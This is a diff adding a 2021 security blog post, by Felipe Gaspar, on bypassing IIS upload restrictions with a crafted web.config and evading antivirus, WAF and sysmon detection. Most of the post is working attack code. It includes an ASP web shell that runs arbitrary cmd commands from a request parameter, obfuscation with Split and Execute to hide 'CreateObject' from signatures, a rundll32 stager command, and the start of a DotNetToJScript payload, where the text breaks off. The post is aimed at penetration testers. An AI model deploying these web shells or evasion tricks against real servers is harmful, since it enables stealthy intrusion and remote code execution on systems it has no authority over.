@@ -1,0 +1,465 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Bypass Upload Restrictions and Evade Detection" /><meta name="author" content="Felipe Gaspar" /><meta property="og:locale" content="en_US" /><meta name="description" content="Let’s be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can’t always do this without getting caught by the Blue Team." /><meta property="og:description" content="Let’s be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can’t always do this without getting caught by the Blue Team." /><link rel="canonical" href="https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/" /><meta property="og:url" content="https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/" /><meta property="og:site_name" content="Fgsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-22T13:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bypass Upload Restrictions and Evade Detection" /><meta name="twitter:site" content="@felipegaspar" /><meta name="twitter:creator" content="@Felipe Gaspar" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Felipe Gaspar"},"description":"Let’s be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can’t always do this without getting caught by the Blue Team.","url":"https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/","@type":"BlogPosting","headline":"Bypass Upload Restrictions and Evade Detection","dateModified":"2021-02-13T01:12:42-03:00","datePublished":"2021-01-22T13:00:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://fgsec.net/posts/Bypass-Upload-Restrictions-and-Evade-Detection/"},"@context":"https://schema.org"}</script><title>Bypass Upload Restrictions and Evade Detection | Fgsec</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-175924413-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-175924413-1'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/25889166?s=460&u=f308a01d882082a7c6ca2e2b00858a8de9e3b20a" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Fgsec</a></div><div class="site-subtitle font-italic">So long, and Thanks for All the Fish.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/fgsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/felipegaspar" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['dontknowmyemail',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Bypass Upload Restrictions and Evade Detection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bypass Upload Restrictions and Evade Detection</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 22, 2021, 1:00 PM -0300" > Jan 22 <i class="unloaded">2021-01-22T13:00:00-03:00</i> </span> by <span class="author"> Felipe Gaspar </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 13, 2021, 1:12 AM -0300" > Feb 13 <i class="unloaded">2021-02-13T01:12:42-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3054 words">16 min</span></div></div><div class="post-content"><p>Let’s be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can’t always do this without getting caught by the Blue Team.</p><p>On this post I’ll be showing a combination of an old technique to bypass upload restriction on ASP/.NET applications and some ways to evade detection.</p><h2 id="step-1---bypass-upload-restrictions">Step 1 - Bypass Upload Restrictions</h2><p>It’s really common to find applications that <del>still</del> use a deny list to restrict file extension, boiling down to a battle between your creativity and the developer’s imagination. Usually you would find that the list contains most of the “bad” extensions:</p><p><code class="language-plaintext highlighter-rouge">"html,htm,php,php2,php3,php4,php5,phtml,pwml,inc,asp,aspx,ascx,jsp,cfm,cfc,pl,bat,exe,com,dll,vbs,js,reg,cgi,htaccess,asis,sh,shtml,shtm,phtm,cfc,cfm,cfml,cfr,cfswf,jsp,jws"</code></p><p>But hey, what if we use something that does not appear to be bad? Presenting: <strong>web.config</strong>. According to <a href="https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-5.0">MS</a>, “The web.config is a file that is read by IIS and the ASP.NET Core Module to configure an app hosted with IIS”.</p><p>Remember that I said something about an old technique? This is it! On 2014 a researcher (@irsdl) shared this technique, which I believe to be the first person to publicly write about it <em>(don’t quote me on that)</em> - You can read it more here: <a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">Upload a web.config File for Fun &amp; Profit</a>.</p><p>The technique is pretty straightforward, we upload a file named <strong>web.config</strong> that sets a special handler to interpret our own file with the ASP script processor, this will make code inside web.config be executed by IIS as a valid ASP file.</p><p><strong>Don’t break things:</strong> It’s important to mention that things may break if you replace an already existent config file, I would recommend you to try to upload this file to a different folder than the application root. This file usually contains critical information like DB connection strings, rules to application path and so on, so be careful.</p><p>Simple “Hello World” with this technique:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;configuration&gt;</span>
+   <span class="nt">&lt;system.webServer&gt;</span>
+      <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">"Read, Script, Write"</span><span class="nt">&gt;</span>
+         <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"web_config"</span> <span class="na">path=</span><span class="s">"*.config"</span> <span class="na">verb=</span><span class="s">"*"</span> <span class="na">modules=</span><span class="s">"IsapiModule"</span> <span class="na">scriptProcessor=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="na">resourceType=</span><span class="s">"Unspecified"</span> <span class="na">requireAccess=</span><span class="s">"Write"</span> <span class="na">preCondition=</span><span class="s">"bitness64"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;/handlers&gt;</span>
+      <span class="nt">&lt;security&gt;</span>
+         <span class="nt">&lt;requestFiltering&gt;</span>
+            <span class="nt">&lt;fileExtensions&gt;</span>
+               <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">".config"</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/fileExtensions&gt;</span>
+            <span class="nt">&lt;hiddenSegments&gt;</span>
+               <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">"web.config"</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/hiddenSegments&gt;</span>
+         <span class="nt">&lt;/requestFiltering&gt;</span>
+      <span class="nt">&lt;/security&gt;</span>
+   <span class="nt">&lt;/system.webServer&gt;</span>
+   <span class="nt">&lt;appSettings&gt;</span>
+<span class="nt">&lt;/appSettings&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+<span class="cp">&lt;!–-
+&lt;% 
+Response.write("Hey there!")
+%&gt;</span>
+-–&gt;
+
+</pre></table></code></div></div><p>Visiting this with your browser should look like the image below, note that our code was inside the “&lt;% %&gt;”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-01.PNG" alt="" /></p><p>We can see our message printed right at the end, but this is not what we want, let’s abuse this to achieve remote code execution!</p><h2 id="step-2---how-to-not-get-caught">Step 2 - How to <del>not</del> get caught</h2><p>This step depends a lot on the security posture of the company you are testing, but lets go through what you may find.</p><h3 id="antivirus---the-first-layer-and-sometimes-only-layer-of-protection">Antivirus - The first layer and sometimes only layer of protection</h3><p>Companies tend to trust a lot on AV solutions, the first thing you must deal is how to drop something on disk that wont trigger detection. From my own experience, you can pretty much combine string dictionaries, eval, execute functions to break this first layer <del>(or don’t just simply copy stuff from github)</del>.</p><p>Let’s examine what this would look like.</p><p>Searching on the interwebs (AKA google) we find the simplest and yet functional ASP web shell: https://github.com/tennc/webshell/blob/master/asp/webshell.asp.</p><p>Adding our XML (from web.config) and removing some HTML lines resulted in the code below:</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="err">?</span><span class="o">&gt;&lt;</span><span class="n">configuration</span><span class="o">&gt;&lt;</span><span class="n">system</span><span class="p">.</span><span class="n">webServer</span><span class="o">&gt;&lt;</span><span class="n">handlers</span> <span class="n">accessPolicy</span><span class="o">=</span><span class="s">"Read, Script, Write"</span><span class="o">&gt;&lt;</span><span class="n">add</span> <span class="n">name</span><span class="o">=</span><span class="s">"new_policy"</span> <span class="n">path</span><span class="o">=</span><span class="s">"*.config"</span> <span class="n">verb</span><span class="o">=</span><span class="s">"GET"</span> <span class="n">modules</span><span class="o">=</span><span class="s">"IsapiModule"</span> <span class="n">scriptProcessor</span><span class="o">=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="n">resourceType</span><span class="o">=</span><span class="s">"Unspecified"</span> <span class="n">requireAccess</span><span class="o">=</span><span class="s">"Write"</span> <span class="n">preCondition</span><span class="o">=</span><span class="s">"bitness64"</span> <span class="o">/&gt;&lt;/</span><span class="n">handlers</span><span class="o">&gt;&lt;</span><span class="n">security</span><span class="o">&gt;&lt;</span><span class="n">requestFiltering</span><span class="o">&gt;&lt;</span><span class="n">fileExtensions</span><span class="o">&gt;&lt;</span><span class="n">remove</span> <span class="n">fileExtension</span><span class="o">=</span><span class="s">".config"</span> <span class="o">/&gt;&lt;/</span><span class="n">fileExtensions</span><span class="o">&gt;&lt;</span><span class="n">hiddenSegments</span><span class="o">&gt;&lt;</span><span class="n">remove</span> <span class="n">segment</span><span class="o">=</span><span class="s">"web.config"</span> <span class="o">/&gt;&lt;/</span><span class="n">hiddenSegments</span><span class="o">&gt;&lt;/</span><span class="n">requestFiltering</span><span class="o">&gt;&lt;/</span><span class="n">security</span><span class="o">&gt;&lt;/</span><span class="n">system</span><span class="p">.</span><span class="n">webServer</span><span class="o">&gt;&lt;</span><span class="n">appSettings</span><span class="o">&gt;&lt;/</span><span class="n">appSettings</span><span class="o">&gt;&lt;/</span><span class="n">configuration</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="p">!</span><span class="err">–</span><span class="o">-</span>
+<span class="o">&lt;</span><span class="err">%</span> 
+
+<span class="k">Set</span> <span class="n">oScript</span> <span class="o">=</span> <span class="n">Server</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"WSCRIPT.SHELL"</span><span class="p">)</span>
+<span class="k">Set</span> <span class="n">oScriptNet</span> <span class="o">=</span> <span class="n">Server</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"WSCRIPT.NETWORK"</span><span class="p">)</span>
+<span class="k">Set</span> <span class="n">oFileSys</span> <span class="o">=</span> <span class="n">Server</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">)</span>
+<span class="k">Function</span> <span class="nf">getCommandOutput</span><span class="p">(</span><span class="n">theCommand</span><span class="p">)</span>
+    <span class="k">Dim</span> <span class="nv">objShell</span><span class="p">,</span> <span class="n">objCmdExec</span>
+    <span class="k">Set</span> <span class="n">objShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
+    <span class="k">Set</span> <span class="n">objCmdExec</span> <span class="o">=</span> <span class="n">objshell</span><span class="p">.</span><span class="n">exec</span><span class="p">(</span><span class="n">thecommand</span><span class="p">)</span>
+    <span class="n">getCommandOutput</span> <span class="o">=</span> <span class="n">objCmdExec</span><span class="p">.</span><span class="n">StdOut</span><span class="p">.</span><span class="n">ReadAll</span>
+<span class="n">end</span> <span class="k">Function</span>
+<span class="nf">szCMD</span> <span class="o">=</span> <span class="n">request</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">)</span>
+<span class="n">thisDir</span> <span class="o">=</span> <span class="n">getCommandOutput</span><span class="p">(</span><span class="s">"cmd /c"</span> <span class="o">&amp;</span> <span class="n">szCMD</span><span class="p">)</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">thisDir</span><span class="p">)</span>
+
+<span class="err">%</span><span class="o">&gt;</span>
+</pre></table></code></div></div><p>And voila.. we have a simple web shell:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-02.png" alt="post02-02" /></p><p>But wait, are we safe to use this code already? Won’t AV solutions flag us? <strong>Yes</strong> and <strong>No</strong>!</p><p>Running the original code against <a href="https://www.virustotal.com/gui/file/06d9ff9671a3a5fb180d7337bddfc0119fd449d14b7ebc3a789298147b22bfaa/detection">VirusTotal results on 15</a> detections but <a href="https://www.virustotal.com/gui/file/a630bfe24837c208b439a8f4876ae1013a0ba4cb7f1bdf270fc9428a6d8b2007/detection">ours a big 0</a>.</p><p><strong>No detection at all!</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-03.png" alt="post02-03" /></p><p><strong>How, you ask?</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://media.tenor.com/images/9f005edb649e847cc9250fbce91d4b23/tenor.gif" alt="" /></p><p>A detection on this level may be due to a couple of factors that will vary depending on the AV running on the host.</p><p>We extracted only the essential part of the original web shell, which means that the detections were probably focusing on the whole file (generally done by looking at the file hash) or specific parts of it (like a specific string contained on that script), as an AV would do with other forms of “malware”.</p><h3 id="how-av-detects-your-web-shell">How AV detects your Web Shell</h3><p>You may find cases where AVs will flag your file if you carry something as simple as a string called “Mimikatz” to the combination of specific functions, file reputation and even run our file in some cloud sandbox. In general, security solutions won’t <del>or shouldn’t</del> just simply flag your file because it uses “WSCRIPT.SHELL” or has a string called “cmd”.</p><html><blockquote class="twitter-tweet"><p lang="en" dir="ltr">When your program name is more the new EICAR than a security tool <a href="https://t.co/ldZkKzgHGW">https://t.co/ldZkKzgHGW</a></p>&mdash; 🥝 Benjamin Delpy (@gentilkiwi) <a href="https://twitter.com/gentilkiwi/status/1161684030108119042?ref_src=twsrc%5Etfw">August 14, 2019</a></blockquote><p><strong>The takeaway from this:</strong></p><ul><li>A simple change into a known payload was enough to evade detection from Antivirus solutions.<li>Understating how AVs flag files should guide you on how to modify and even create your own payloads.<li>Sometimes AVs will flag stupid things, you just have to test it before using in a real target (information gathering goes a long way) and be creative on how to bypass it.</ul><p>In short, if you are trying to use something that already exists on your kali machine without any modifications, chances are <strong>you will be caught.</strong></p><h3 id="waf---nice-web-shell-youve-got-here-bro-we-wouldnt-want-anything-to-happen-to-it">WAF - Nice web shell you’ve got here bro, we wouldn’t want anything to happen to it.</h3><p>There is one additional defense layer not mentioned so far that could make your life a bit difficult: <strong>WAF</strong> (Web Application Firewall); Some have rules to block your attempt to upload files that may contain combination of known strings used in a web shell.</p><p>In a couple of engagements I found that you may combine the same techniques to evade both WAF and AVs. Let’s examine how this works.</p><p>With WAF bypasses I like to start with the following routine:</p><ol><li><strong>Understand how the WAF blocks your request</strong> - This may vary to a simple redirect, error message, challenge &amp; response mechanism. It’s important to understand how this is presented, usually sending a simple SQLI payload will do the trick for you to see this behaviour.<li><strong>Test your Payload</strong> - You don’t actually need to wait to test your payload directly on your vulnerable point. Use a different IP in a different page, run some tests with fragments of your payload and see how it responds.<li><strong>Repeat -</strong> Test your payload a couple of times before using against your target.</ol><p>I always like to code some python script to help me with this task, and I usually break every piece of my payload into small strings to list the parts that will give me trouble when D-day arrives.</p><p>To illustrate it better let’s imagine that we just sent our payload and got caught by the WAF. Doing the process I’ve described we broke our code into small pieces and discovered that the word “<strong>CreateObject</strong>” triggered the rule.</p><p>What can we do about it?</p><h4 id="string-dictionary-to-the-rescue">String Dictionary to the rescue</h4><p>We can transform our string into something that will only make sense when executed. There’s a couple of ways to achieve this and I’ll be showing you the easiest way:</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="k">Dim</span> <span class="nv">x</span>
+<span class="n">x</span> <span class="o">=</span> <span class="n">Split</span><span class="p">(</span><span class="s">"a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"</span><span class="p">,</span><span class="s">","</span><span class="p">)</span>
+<span class="n">Execute</span><span class="p">(</span><span class="s">"Set oScript = "</span><span class="o">+</span><span class="n">x</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="s">"reate"</span><span class="o">+</span><span class="n">x</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="o">+</span><span class="s">"bject(</span><span class="se">""</span><span class="s">WSCRIPT.SHELL</span><span class="se">""</span><span class="s">)"</span><span class="p">)</span>
+</pre></table></code></div></div><p>With “Split()” we created a simple dictionary that can then be used to create the strings that are getting blocked. The “Execute()” acts in the same way as an “Eval()”, but in this context the code will be treated as a simple assignment statement whereas with eval it would result in a comparison (<a href="https://docs.microsoft.com/en-us/previous-versions//0z5x4094(v=vs.85)?redirectedfrom=MSDN">you can read more here</a>).</p><p>Do this with every piece of <em>“bad”</em> string and you are good to go.</p><h2 id="step-3---evade-detection">Step 3 - Evade Detection</h2><p>Making our payload undetectable by AV and WAF solutions should be enough to evade most detections, but more and more we see the usage of tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">sysmon</a> to detect binaries launched by IIS and Apache.</p><p>Before going further, let’s first understand how this type of detection works.</p><p>For this, we’ll use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> and interact with our web shell.</p><p>To keep things simple, add a filter (ctrl+l) to display only entries for Process name “w3wp.exe” and “cmd.exe”:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-04.png" alt="post02-04" /></p><p>Then, execute a simple “whoami” command with our webshell.</p><p>Eventually, you will see an entry for “Process Create” operation for “cmd.exe” from the “w3wp.exe” binary:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-05.png" alt="post02-05" /></p><p>Examining further, we can see the executed command along with it’s parameters:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-06.png" alt="post02-06" /></p><p>This is exactly what sysmon and some EDR solutions will look for. So there goes all the work we put into getting our code executed.</p><p>If you record from our code, we are using a reference to the “WScript.Shell” object, which is simply calling the binary passed with the “exec” method. In our case: <code class="language-plaintext highlighter-rouge">"cmd /c &lt;COMMAND&gt;"</code> - that’s why we see that “cmd.exe” is been called to execute whatever command executed by our web shell.</p><p>One may think that the simple thing here would be to replace cmd with some other binary, maybe the most recent sexy addition on the <a href="https://lolbas-project.github.io/#">LOLBAS</a> project, but we are essentially doing the same thing.</p><p>Let’s drop our DLL stager on disk and use rundll32 to execute it:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="go">rundll32.exe C:\inetpub\wwwroot\application\notsuspicious.dll,Start
+</span></pre></table></code></div></div><p>Aaaand…. as you can see:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-07.png" alt="post02-07" /></p><p>We are still using “w3wp.exe” to spawn processes:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-08.png" alt="post02-08" /></p><p>The question is, can we execute our stager directly without needing to spawn a new process?</p><h2 id="step-4---run-our-code">Step 4 - Run our code</h2><p>For this task we’ll be using <strong>DotNetToJScript</strong>. You can read more about this awesome project here: https://github.com/tyranid/DotNetToJScript.</p><p>Let’s start by introducing something that many people don’t know: <strong>ASP Classic</strong> is essentially a server-side script engine that uses <strong>VBScript</strong> as it’s default scripting language.</p><p>With <strong>DotNetToJScript</strong> we can not only create payloads for JScript but also for VBScript, and that’s exactly what we’ll be doing.</p><p>To start, you can clone the repository directly from github and open it with Visual Studio.</p><h3 id="writing-a-simple-payload">Writing a Simple Payload</h3><p>You can use an already existing example project “ExampleAssembly” that comes inside with the tool, and write the necessary code for your reverse shell or go even further and use Win32 API to inject shell code for your favorite C2 implant.</p><p>I’ll be doing something simple for this post and write a file to disk:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/post02-09.png" alt="post02-09" /></p><p>Now, rebuild the entire solution… and we should have both <strong>DotNetToJScript</strong> binary and <strong>ExampleAssembly</strong> DLL ready to go.</p><h3 id="generating-vbs-payload">Generating VBS Payload</h3><p>Since we are using the TestClass example that comes with the tool, we can execute the following command:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="go">.\DotNetToJScript.exe ExampleAssembly.dll -o="output.vbs" --ver=None --lang=VBScript
+</span></pre></table></code></div></div><p>The first parameter (ExampleAssembly.dll) is our payload created in the last step, then our output location and some options. I recommend you testing the best option for you, since this may variate accordingly to your target, but <code class="language-plaintext highlighter-rouge">--ver=None</code> will result in a version without “WSCRIPT.SHELL”, which is exactly what we want.</p><p>Since we are going with the default script engine, VBScript, we are passing <code class="language-plaintext highlighter-rouge">--lang=VBScript</code>.</p><p>And that’s it, just copy and past to our “web.config” and execute it:</p><div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="err">?</span><span class="o">&gt;&lt;</span><span class="n">configuration</span><span class="o">&gt;&lt;</span><span class="n">system</span><span class="p">.</span><span class="n">webServer</span><span class="o">&gt;&lt;</span><span class="n">handlers</span> <span class="n">accessPolicy</span><span class="o">=</span><span class="s">"Read, Script, Write"</span><span class="o">&gt;&lt;</span><span class="n">add</span> <span class="n">name</span><span class="o">=</span><span class="s">"new_policy"</span> <span class="n">path</span><span class="o">=</span><span class="s">"*.config"</span> <span class="n">verb</span><span class="o">=</span><span class="s">"GET"</span> <span class="n">modules</span><span class="o">=</span><span class="s">"IsapiModule"</span> <span class="n">scriptProcessor</span><span class="o">=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="n">resourceType</span><span class="o">=</span><span class="s">"Unspecified"</span> <span class="n">requireAccess</span><span class="o">=</span><span class="s">"Write"</span> <span class="n">preCondition</span><span class="o">=</span><span class="s">"bitness64"</span> <span class="o">/&gt;&lt;/</span><span class="n">handlers</span><span class="o">&gt;&lt;</span><span class="n">security</span><span class="o">&gt;&lt;</span><span class="n">requestFiltering</span><span class="o">&gt;&lt;</span><span class="n">fileExtensions</span><span class="o">&gt;&lt;</span><span class="n">remove</span> <span class="n">fileExtension</span><span class="o">=</span><span class="s">".config"</span> <span class="o">/&gt;&lt;/</span><span class="n">fileExtensions</span><span class="o">&gt;&lt;</span><span class="n">hiddenSegments</span><span class="o">&gt;&lt;</span><span class="n">remove</span> <span class="n">segment</span><span class="o">=</span><span class="s">"web.config"</span> <span class="o">/&gt;&lt;/</span><span class="n">hiddenSegments</span><span class="o">&gt;&lt;/</span><span class="n">requestFiltering</span><span class="o">&gt;&lt;/</span><span class="n">security</span><span class="o">&gt;&lt;/</span><span class="n">system</span><span class="p">.</span><span class="n">webServer</span><span class="o">&gt;&lt;</span><span class="n">appSettings</span><span class="o">&gt;&lt;/</span><span class="n">appSettings</span><span class="o">&gt;&lt;/</span><span class="n">configuration</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="p">!</span><span class="err">–</span><span class="o">-</span>
+<span class="o">&lt;</span><span class="err">%</span> 
+<span class="k">Sub</span> <span class="nf">DebugPrint</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
